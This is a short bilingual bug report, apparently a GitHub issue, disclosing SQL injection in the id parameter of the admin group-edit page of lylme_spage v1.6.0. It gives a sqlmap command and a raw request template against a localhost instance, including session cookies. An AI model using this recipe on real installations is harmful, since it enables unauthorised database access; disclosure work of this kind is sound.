https://gitee.com/lylme/lylme_spage/tree/v1.6.0

当我们点击后台的分组管理 编辑按钮时 id存在sql注入漏洞
sql injection vulnerability exists when we click the group management Edit button in the background

![image](https://github.com/user-attachments/assets/160d2142-126d-4ddf-90ea-c408bfa5b2f2)

![image](https://github.com/user-attachments/assets/a18dfc22-5c2e-4ced-b136-b857f9304f9b)

sqlmap -r filename --dbms mysql

GET /admin/group.php?set=edit&id=* HTTP/1.1
Host: 127.0.0.1:9998
sec-ch-ua: "Not=A?Brand";v="99", "Chromium";v="118"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Windows"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: http://127.0.0.1:9998/admin/group.php
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Cookie: admin_token=90d7M%2F3WDbztaftquNBfPRbNjPw3LxjDKcUaDvO7bEYpzHRRwwPyLNeT0td94g7p9w%2FXL0yfP9yV79VFuXdofmtlOg; BRPcM_admin_username=6876tBBUp5geSxCQN5sA1iKcxHKWIYz21qWkazG8S7yeLg; BRPcM_siteid=d932okj60sk0B9TkqM1wpAl87Z7cVJGoQaDRLspG; BRPcM_userid=f73dmCvThxA-y9q6p7E4mTCO1Yu7GN2Md5i5VRay; BRPcM_admin_email=d4adXnvKveOWi9fo2VEdwAuaB8F34r9gqTCJ-An7Vr_H5Pge; BRPcM_sys_lang=95b7Z8OobH3UEBHG6reEsIAHxg3si_OotB0pwqWUH0FmZg; JSESSIONID=ZCgZNzqIkXhtv3WhzYFl5fjxcB9DdC4id5mxh0O1; PHPSESSID=qkk1eisjp2p17ce7tll9tfq6vb; admin_token=c5f7pAlNpu4s4xQllufPvMzOK6dR6J2Z0TkaFIgtOFzg1VKSltZq614l0Nc7mTL2SmmcluK6%2FUhwXZFDZ4UROQNqGg
Connection: close

![image](https://github.com/user-attachments/assets/c39dc272-8ebd-4b5c-96a0-2dabbd0b96f7)
